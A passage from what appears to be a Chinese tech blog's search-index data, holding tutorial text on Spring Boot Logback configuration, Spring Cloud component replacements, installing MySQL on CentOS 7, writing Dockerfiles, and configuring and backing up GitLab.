%m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}"/&gt; &lt;!--输出到控制台--&gt; &lt;appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;!--此日志appender是为开发使用，只配置最底级别，控制台输出的日志级别是大于或等于此级别的日志信息--&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;Pattern&gt;${CONSOLE_LOG_PATTERN}&lt;/Pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--输出到日志文件--&gt; &lt;!-- 时间滚动输出level为DEBUG日志 --&gt; &lt;appender name="DEBUG_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_debug.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- 日志归档 --&gt; &lt;fileNamePattern&gt;${log.path}/debug/log-debug-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录DEBUG级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;debug&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为INFO日志 --&gt; &lt;appender name="INFO_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_info.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- 每天日志归档路径以及格式 --&gt; &lt;fileNamePattern&gt;${log.path}/info/log-info-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录INFO级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为WARN日志 --&gt; &lt;appender name="WARN_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_warn.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/warn/log-warn-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录WARN级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;warn&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为ERROR日志 --&gt; &lt;appender name="ERROR_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_error.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/error/log-error-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录ERROR级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;root level="info"&gt; &lt;appender-ref ref="CONSOLE" /&gt; &lt;appender-ref ref="DEBUG_FILE" /&gt; &lt;appender-ref ref="INFO_FILE" /&gt; &lt;appender-ref ref="WARN_FILE" /&gt; &lt;appender-ref ref="ERROR_FILE" /&gt; &lt;/root&gt;&lt;/configuration&gt; 1234logging: level: com.nmys.view: debug config: classpath:logback/logback-spring.xml 参考资料 Spring Boot 整合 Logback 日志框架 Spring Boot 2.0 整合 Logback 日志框架 Spring Boot 使用 Logback 日志框架超详细教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java"},{title:"SpringCloud 各组件的版本说明（持续更新）",url:"/posts/88441946.html",text:'Netflix 各组件替代方案替代方案概览 替代方案说明Hystrix Netflix Hystrix 是 Spring Cloud 中最早支持的一种容错方案，在 2018 年 11 月 20 日之后官方已经停止维护，最后一个正式版本为 1.5.18。在 Spring Cloud Greenwich 版中，Spring 官方推荐使用 Resilience4j 替代 Hystrix。 Zuul 1.x Netflix 虽然已经在 2018 年 5 月开源了 Zuul 2.x，但由于 Zuul 2.x 在 Spring Cloud Gateway 孵化之前一直跳票发布，而且 Spring Cloud Gateway 目前已经孵化成功，相较于 Zuul 1.x 在功能以及性能上都有明显的提升。Spring 官方推荐使用 Spring Cloud Gateway 替代 Zuul 1.x，因此在 Spring Boot 2.0 以上版本中，并没有对 Zuul 2.0 以上最新高性能版本进行集成，仍然使用 Zuul 1.x 非 Reactor 模式（基于 Servlet 2.5 阻塞架构）的旧版本。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Centos7 使用 RPM 源安装 MySQL",url:"/posts/988f02de.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 卸载 Mariadb 12345# 查找mariadb模块# rpm -qa | grep mariadb# 删除查找到的mariadb模块# rpm -e --nodeps xxxx RPM 源安装 MySQL 1234567891011121314151617# 下载repository# wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm# 安装repository# rpm -ivh mysql57-community-release-el7-11.noarch.rpm# 查看repository是否安装成功# yum repolist enabled | grep "mysql.*-community.*"# 安装mysql# yum install -y mysql-community-libs-compat mysql-community-server# 启动mysql# systemctl start mysqld# 查看mysql启动状态# systemctl status mysqld 开机自启动 MySQL 12345# 自启动# systemctl enable mysqld# 重载配置# systemctl daemon-reload 更改 Root 本地登录密码、允许 Root 远程登录 1234567891011121314# 查看mysql安装时默认创建的密码# grep \'temporary password\' /var/log/mysqld.log# 登录mysql# mysql -h localhost -u root -p# 更改root本地登录密码（由于mysql自身默认的密码检查策略，密码必须包含：大小写字母、数字和特殊符号，并且长度不能少于8位）mysql&gt; ALTER USER \'root\'@\'localhost\' IDENTIFIED BY \'yourPassword\';# 允许root远程登录mysql&gt; GRANT ALL PRIVILEGES ON *.* TO \'root\'@\'%\' IDENTIFIED BY \'yourPassword\' WITH GRANT OPTION;# 刷新mysql的系统权限相关表mysql&gt; FLUSH PRIVILEGES; MySQL 基础配置、性能优化配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 备份默认的配置文件# cp /etc/my.cnf /etc/my.cnf.default# 编辑配置文件，添加以下内容# vim /etc/my.cnf[client]default-character-set=utf8[mysql]default-character-set=utf8[mysqld]character-set-server=utf8default-storage-engine=INNODBdefault-time-zone="+8:00"explicit_defaults_for_timestamp=true########################################max_allowed_packet=64Mback_log=800 #重点优化max_connections=5000 #重点优化table_open_cache=614 #重点优化，其值与max_connections相关sort_buffer_size=2M #重点优化，其值与max_connections相关join_buffer_size=2M #重点优化，其值与max_connections相关thread_cache_size=300 #重点优化query_cache_size=64M #重点优化query_cache_limit=4Mquery_cache_min_res_unit=2ktmp_table_size=256Mkey_buffer_size=2048M #重点优化read_buffer_size=1M #其值与max_connections相关read_rnd_buffer_size=16M #其值与max_connections相关bulk_insert_buffer_size=64Minnodb_buffer_pool_size=2048M #重点优化innodb_thread_concurrency=0 #重点优化innodb_flush_log_at_trx_commit=1 #重点优化innodb_log_buffer_size=8Minnodb_log_file_size=128Minnodb_log_files_in_group=3 配置防火墙 12345678# 开放端口# firewall-cmd --zone=public --permanent --add-port=3306/tcp# 保存防火墙配置# firewall-cmd --reload# 查看已开放的端口# firewall-cmd --list-ports 管理 MySQL 服务 1234567891011# 关闭# systemctl stop mysqld# 启动# systemctl start mysqld# 重启# systemctl restart mysqld# 查看状态# systemctl status mysqld 更改系统的最大打开文件描述符数 本站教程 配置概述 123456配置文件：/etc/my.cnf数据目录：/var/lib/mysql日志文件：/var/log/mysqld.logpid文件：/var/run/mysqld/mysqld.pidsocket文件：/var/lib/mysql/mysql.sock服务启动脚本：/usr/lib/systemd/system/mysqld.service var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Docker 之七实战 Dockerfile 的简单编写",url:"/posts/24ee2660.html",text:'实战内容介绍 实战编写 Dockerfile，指定终端登录后的默认路径，同时预安装 vim、ifconfig 工具，最后通过 Dockerfile 构建新的 Centos 镜像并运行起来。 编写 Dockerfile 文件 12345678910FROM centosMAINTAINER peter&lt;peter@gmail.com&gt;ENV work_path /usr/localWORKDIR $work_pathRUN yum -y update &amp;&amp; yum -y install vim net-toolsCMD /bin/bash 构建新的 Docker 镜像 1234567891011# 拉取最新的Centos镜像# docker pull centos# 创建Dockerfile文件，并写入上述的文件内容# vi ~/dockerfile-centos# 通过Dockerfile文件构建新的Docker镜像# docker build -f ~/dockerfile-centos -t peter/centos:1.1 .# 可以使用--no-cache参数让Docker构建镜像时不使用缓存（中间镜像）# docker build --no-cache=True -f ~/dockerfile-centos -t peter/centos:1.1 . 构建新 Docker 镜像时输出的日志信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344Sending build context to Docker daemon 93.82MBStep 1/8 : FROM centos ---&gt; 1e1148e4cc2cStep 2/8 : MAINTAINER peter&lt;peter@gmail.com&gt; ---&gt; Running in bff9f4e99fc1Removing intermediate container bff9f4e99fc1 ---&gt; 058e53021a24Step 3/8 : ENV work_path /usr/local ---&gt; Running in 33e3edef7380Removing intermediate container 33e3edef7380 ---&gt; 52f1709ed735Step 4/8 : WORKDIR $work_path ---&gt; Running in 1304b1642e5aRemoving intermediate container 1304b1642e5a ---&gt; a158527938a7Step 5/8 : RUN yum -y update ---&gt; Running in 654318bc1889Loaded plugins: fastestmirror, ovlDetermining fastest mirrors * base: mirror.jdcloud.com * extras: mirror.jdcloud.com * updates: mirrors.cn99.comResolving Dependencies--&gt; Running transaction check---&gt; Package systemd.x86_64 0:219-62.el7 will be updated---&gt; Package systemd.x86_64 0:219-62.el7_6.2 will be an update---&gt; Package systemd-libs.x86_64 0:219-62.el7 will be updated---&gt; Package systemd-libs.x86_64 0:219-62.el7_6.2 will be an update---&gt; Package tzdata.noarch 0:2018g-1.el7 will be updated---&gt; Package tzdata.noarch 0:2018i-1.el7 will be an update--&gt; Finished Dependency Resolution...（省略）Step 7/8 : EXPOSE 80 ---&gt; Running in 4aae7e66419cRemoving intermediate container 4aae7e66419c ---&gt; b5647b33ffb8Step 8/8 : CMD /bin/bash ---&gt; Running in 877a21e5c705Removing intermediate container 877a21e5c705 ---&gt; 90fed978ec5cSuccessfully built 90fed978ec5cSuccessfully tagged peter/centos:1.1 查看新构建的 Docker 镜像 12345678910111213141516171819# 查看新的Docker镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/centos 1.1 8544847124e9 3 minutes ago 385MBcentos latest 1e1148e4cc2c 6 weeks ago 202MB# 查看新Docker镜像的构建历史# docker history peter/centos:1.1IMAGE CREATED CREATED BY SIZE COMMENT90fed978ec5c 2 hours ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "/bin… 0Bb5647b33ffb8 2 hours ago /bin/sh -c #(nop) EXPOSE 80 0B3c621d86e6de 2 hours ago /bin/sh -c yum -y install vim net-tools 79.5MBa83741b44f7b 2 hours ago /bin/sh -c yum -y update 104MBa158527938a7 2 hours ago /bin/sh -c #(nop) WORKDIR /usr/local 0B52f1709ed735 2 hours ago /bin/sh -c #(nop) ENV work_path=/usr/local 0B058e53021a24 2 hours ago /bin/sh -c #(nop) MAINTAINER peter&lt;peter@gm… 0B1e1148e4cc2c 6 weeks ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) LABEL org.label-schema.sc… 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) ADD file:6f877549795f4798a… 202MB 以交互方式运行新构建的 Docker 镜像 123456789101112131415# 以交互式运行新的Docker镜像# docker run -it --name="peter-centos" peter/centos:1.1# 退出终端（不停止容器）# ctrl + p + q# 查看当前所有正在运行的Docker容器# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESb1a8c8ac1efc peter/centos:1.1 "/bin/sh -c /bin/bash" 2 minutes ago Up 2 minutes 80/tcp peter-centos# 重新连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it peter-centos /bin/bash# 注意：如果以后台方式运行上面新构建的Docker镜像，当容器启动完成后会马上关闭，因为Docker会认为容器内没有需要运行的应用（指当前容器内没有前台运行的进程）。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Docker 之六 Dockerfile 详解",url:"/posts/7d424db2.html",text:'Dockerfile 介绍 Dockerfile 是用来构建 Docker 镜像的文件，实质是一系列命令和参数构成的脚本文件。当 Dockerfile 文件编写完之后，可以通过 “docker build” 与”docker run” 命令构建并运行新的 Docker 镜像。其中 Dockerfile 定义了进程需要的一切东西，涉及的内容包括执行代码或者文件、环境变量、依赖包、运行时环境、动态链接库、操作系统的发行版本、服务进程和内核进程（当应用进程需要和系统服务、内核进程打交道的时候，需要考虑如何设计 namespace 的权限控制）等等。 Dockerfile、Docker 镜像、Docker 容器三者的关系 Dockerfile 面向开发，Docker 镜像是交付标准，Docker 容器则涉及部署与运维，三者缺一不可，合力充当 Docker 体系的基石。从应用软件的角度来看，Dockerfile、Docker 镜像与 Docker 容器分别代表软件的三个不同阶段，其中 Dockerfile 是软件的原材料，Docker 镜像是软件的交付品，Docker 容器则可以认为是软件的运行状态，示意图如下： Dockerfile 编写示例 123456789101112# Centos7官方的DockerfileFROM scratchADD centos-7-docker.tar.xz /LABEL org.label-schema.schema-version="1.0" \\ org.label-schema.name="CentOS Base Image" \\ org.label-schema.vendor="CentOS" \\ org.label-schema.license="GPLv2" \\ org.label-schema.build-date="20181205"CMD ["/bin/bash"] Dockerfile 基础知识 #表示注释 指令按照从上到下的顺序执行 每条指令都会创建一个镜像层，并对镜像进行提交 每条保留字指令都必须为大写字母格式，且后面至少要跟随一个参数 Docker 执行 Dockerfile 的大致流程 Docker 从基础镜像运行一个容器 执行一条指令并对容器作出修改 执行类似”docker commit” 的操作来提交一个新的镜像层 Docker 再基于刚提交的新镜像运行一个新容器 执行 Dockerfile 中的下一条指令，重复上面的执行流程，直到所有指令都执行完成 Dockerfile 指令 - FROM 1234567功能：指定基础镜像，并且必须是第一条指令；如果不以任何第三方镜像为基础，那么写法为：FROM scratch语法：FROM &lt;image&gt;FROM &lt;image&gt;:&lt;tag&gt;FROM &lt;image&gt;:&lt;digest&gt;三种写法，其中&lt;tag&gt;和&lt;digest&gt; 是可选项，如果没有选择，那么默认值为latest Dockerfile 指令 - MAINTAINER 123功能：指定镜像维护者，可以是维护者的姓名、邮箱地址、网页地址等语法：MAINTAINER &lt;name&gt; Dockerfile 指令 - RUN 123456789101112131415功能：指定镜像构建时需要运行的命令，一般用于更新系统、安装应用软件等语法：RUN &lt;command&gt;RUN ["executable", "param1", "param2"]第一种写法后边直接跟shell命令，在linux操作系统上默认是"/bin/sh -c"，在windows操作系统上默认是"cmd /S /C"第二种写法是类似于函数调用，可将executable理解成为可执行文件，后面就是两个参数RUN指令使用\\作为换行符示例：RUN /bin/bash -c "source $HOME/.bashrc; echo $HOME"RUN ["/bin/bash", "-c", "echo hello"]注意：多行命令尽量不要写多个RUN，原因是Dockerfile中每一个指令都会建立新的镜像层；多少个RUN就构建了多少个镜像层，会造成镜像的臃肿、多层，不仅仅增加了构建部署的时间，还容易出错 Dockerfile 指令 - ENV 123456功能：设置环境变量语法：ENV &lt;key&gt; &lt;value&gt;ENV &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...两者的区别就是第一种是一次设置一个，第二种是一次设置多个 Dockerfile 指令 - WORKDIR 12345678910功能：设置工作目录（即容器创建并启动后，通过终端登录进来所处的目录）；对RUN、CMD、ENTRYPOINT、COPY、ADD指令生效，如果目录不存在则会自动创建，可以设置多次语法：WORKDIR /path/to/workdir注意：WORKDIR可以解析环境变量，例如：ENV DIRPATH /pathWORKDIR $DIRPATHRUN pwd Dockerfile 指令 - ADD 123456789101112131415功能：将宿主机目录下的文件拷贝进镜像中，且支持url解析与自动解压tar压缩包语法：ADD &lt;src&gt;... &lt;dest&gt;ADD ["&lt;src&gt;",... "&lt;dest&gt;"]&lt;src&gt;可以是一个本地文件或者是一个本地压缩文件，还可以是一个url（此时类似于wget命令）&lt;dest&gt;路径的填写可以是容器内的绝对路径，也可以是相对于工作目录的相对路径示例：ADD test relativeDir/ADD test /relativeDirADD http://example.com/foobar /注意：任何压缩文件通过url的方式进行拷贝，都不会自动解压；同时尽量不要把&lt;scr&gt;写成一个文件夹，如果&lt;src&gt;是一个文件夹，则复制整个目录的内容，包括文件系统元数据 Dockerfile 指令 - COPY 12345678功能：将宿主机目录下的文件拷贝进镜像中语法：COPY &lt;src&gt;... &lt;dest&gt;COPY ["&lt;src&gt;",... "&lt;dest&gt;"]注意：COPY指令只能拷贝本地文件，不支持url解析，不会自动解压tar压缩包，除此之外其他用法与ADD指令一致 Dockerfile 指令 - VOLUME 12345678功能：数据卷，用于容器内数据的保存和持久化语法：VOLUME /dataVolumeVOLUME ["/dataVolume"]VOLUME /dataVolume1 /dataVolume2VOLUME ["/dataVolume1","/dataVolume2"]参数可以是一个JsonArray ，也可以是单个或多个值，上面四种写法都是正确的 Dockerfile 指令 - CMD 1234567891011121314151617功能：指定容器启动时需要执行的命令语法：CMD ["executable","param1","param2"]CMD command param1 param2CMD ["param1","param2"]第一种使用exec执行，推荐使用第二种在/bin/sh中执行，提供给需要交互的应用第三种指定提供给ENTRYPOINT指令的参数示例：CMD [ "sh", "-c", "echo $HOME"]CMD /bin/bash -c "echo $HOME"CMD [ "echo", "$HOME"]注意：每个Dockerfile文件只能有一条CMD命令，如果指定了多条CMD指令，只有最后一条CMD指令会被执行。同时如果用户启动容器时候指定了运行的命令，则会覆盖掉Dockerfile文件中CMD指令指定的命令；例如“docker run -it peter/centos:1.1 ls -al”中的“ls -al”会覆盖Dockerfile文件中的CMD指令。 Dockerfile 指令 - ENTRYPOINT 123456789101112131415161718功能：指定容器启动时需要执行的命令语法：ENTRYPOINT ["executable", "param1", "param2"]ENTRYPOINT command param1 param2示例：ENTRYPOINT [ "sh", "-c", "echo $HOME"]ENTRYPOINT /bin/bash -c "echo $HOME"ENTRYPOINT与CMD指令的相同点：1) 容器启动时才执行指令，运行时机相同2) 每个Dockerfile文件只能有一条ENTRYPOINT/CMD命令，如果指定了多条ENTRYPOINT/CMD指令，只有最后一条ENTRYPOINT/CMD指令会被执行ENTRYPOINT与CMD指令的不同点：1）如果用户启动容器时指定了运行的命令，ENTRYPOINT指令不会被覆盖（会追加后续用户启动容器时指定的命令内容），而CMD指令则会被覆盖2）如果在Dockerfile中同时写了ENTRYPOINT和CMD指令，并且CMD指令不是一个完整的可执行命令，那么CMD指令的内容将会作为ENTRYPOINT指令的参数3）如果在Dockerfile中同时写了ENTRYPOINT和CMD指令，并且CMD指令是一个完整的指令，那么它们两个会互相覆盖，谁在最后谁生效 Dockerfile 指令 - ONBUILD 12345678功能：该指令只对当前镜像的子镜像生效，即父镜像在被子镜像继承后，父镜像Dockerfile中的ONBUILD指令会被触发语法：ONBUILD [INSTRUCTION]示例：ONBUILD RUN [ "npm", "install" ]ONBUILD COPY ./package.json /app Dockerfile 指令 - EXPOSE 123456789功能：暴露容器运行时监听的端口，使容器内的应用可以通过端口和外界通信语法：EXPOSE port1EXPOSE port2EXPOSE port3注意：EXPOSE指令并不会让容器监听的端口映射到宿主机的端口，如果想使容器监听的端口与宿主机的端口有映射关系，必须在容器启动的时候指定"-P"或者"-p"参数 Dockerfile 指令 - USER 12345678功能：指定启动容器的用户，可以是用户名或UID语法：USER adminUSER UID注意：如果设置了容器以admin用户去运行，那么RUN、CMD、ENTRYPOINT指令都会以这个用户身份去运行 Dockerfile 指令 - STOPSIGNAL 1234功能：指定当容器退出时给系统发送指定的信号语法：STOPSIGNAL signal Dockerfile 指令 - ARG 1234567891011功能：定义变量语法：ARG &lt;name&gt;[=&lt;default value&gt;]示例：ARG user1ARG buildno=1注意：当使用ARG指令定义了一个变量，在执行"docker build"命令构建镜像的时候，使用"--build-arg &lt;varname&gt;=&lt;value&gt;"来指定变量的值；如果用户在构建镜像时指定了一个没有定义在Dockerfile中的变量，那么Docker将会抛出一个Warning；如果ARG定义的变量拥有默认值，那么当构建镜像没有指定变量值的时候，将会使用这个默认值 Dockerfile 指令 - LABEL 12345678910111213功能：为镜像指定标签语法：LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...示例：LABEL "com.example.vendor"="ACME Incorporated"LABEL multi.label1="value1" \\multi.label2="value2" \\other="value3"注意：Dockerfile中可以有多个LABEL指令，但是建议只使用一个LABEL指令并写成一行，如太长需要换行则可以使用\\符号作为换行符。LABEL指令会继承基础镜像中的LABEL指令，如遇到key相同，则覆盖父镜像的值 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Git 之八 - Gitlab 详细使用教程",url:"/posts/79923b91.html",text:'上篇 - Git 之七 - Centos7 搭建 Gitlab 服务器 Gitlab 常规配置 12345678910111213141516171819202122232425262728# 编辑Gitlab的配置文件# vim /etc/gitlab/gitlab.rb# 配置unicorn的端口（默认8080），注意不要用8082、9090端口，因为自带工具会占用unicorn[\'port\'] = 9999# 配置Gitlab的默认备份路径gitlab_rails[\'backup_path\'] = "/var/opt/gitlab/backups"# 配置邮件发送gitlab_rails[\'smtp_enable\'] = truegitlab_rails[\'smtp_address\'] = "smtp.exmail.qq.com"gitlab_rails[\'smtp_port\'] = 25gitlab_rails[\'smtp_user_name\'] = "huangdc@domain.com"gitlab_rails[\'smtp_password\'] = "smtp password"gitlab_rails[\'smtp_authentication\']= "plain"gitlab_rails[\'smtp_enable_starttls_auto\']= truegitlab_rails[\'gitlab_email_from\']= "huangdc@domain.com"gitlab_rails[\'gitlab_email_reply_to\']= "noreply@domain.com"# 配置SSH的端口（默认22），修改之后Gitlab中项目的SSH地址会在前面加上协议头和端口号，例如“ssh://git@192.168.1.198:55725/lisi/test.git”gitlab_rails[\'gitlab_shell_ssh_port\'] = 55725# 重新编译Gitlab的配置# gitlab-ctl reconfigure# 重启GitLab# gitlab-ctl restart Gitlab 定时备份 123456# 添加定时备份任务，crontab表达式根据自己的需要进行修改，最后wq存盘退出crontab的编辑状态# crontab -e0 2 * * * /usr/bin/gitlab-rake gitlab:backup:create CRON=1# 查看计划任务是否添加成功# crontab -l Gitlab 恢复备份 12345678910111213# 停止unicorn和sidekiq，保证数据库没有新的连接，不会有新的数据写入# gitlab-ctl stop unicorn# gitlab-ctl stop sidekiq# 进入gitlab的备份目录# cd /var/opt/gitlab/backups# 恢复指定的备份文件，1547096290_2019_01_10_11.6.3是备份文件的编号# gitlab-rake gitlab:backup:restore BACKUP=1547096290_2019_01_10_11.6.3# 启动unicorn和sidekiq# gitlab-ctl start unicorn# gitlab-ctl start sidekiq var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", 